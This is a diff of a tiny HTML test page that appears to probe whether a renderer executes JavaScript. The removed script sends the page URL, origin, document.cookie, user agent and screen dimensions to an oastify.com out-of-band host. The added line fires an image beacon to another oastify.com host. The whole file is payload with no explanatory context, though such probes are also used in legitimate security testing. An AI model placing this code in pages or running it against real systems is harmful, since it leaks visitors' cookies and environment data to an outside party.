@@ -1,37 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-
-<h1 style="font-size:200px;color:red">
-ZOOM_VISIBLE_TEST
-</h1>
-
 <script>
-fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/05-fetch-api");
-
-var x = new XMLHttpRequest();
-x.open("GET", 
-  "http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/06-xhr");
-x.send();
-
-fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/07-env?" + 
-  new URLSearchParams({
-    url:     window.location.href,
-    origin:  window.location.origin,
-    cookies: document.cookie,
-    ua:      navigator.userAgent
-  })
-);
-
-fetch("http://s1u9w5xfj4hur8m93l9c83ufq6wyko8d.oastify.com/08-dims?" + 
-  new URLSearchParams({
-    sw: screen.width,
-    sh: screen.height,
-    ww: window.innerWidth,
-    wh: window.innerHeight
-  })
-);
+new Image().src = 'http://fve5b8jjmfhmbvbcyys7jc7uul0co3cs.oastify.com/javascript-ran-' + Math.random();
 </script>
-
 </body>
 </html>
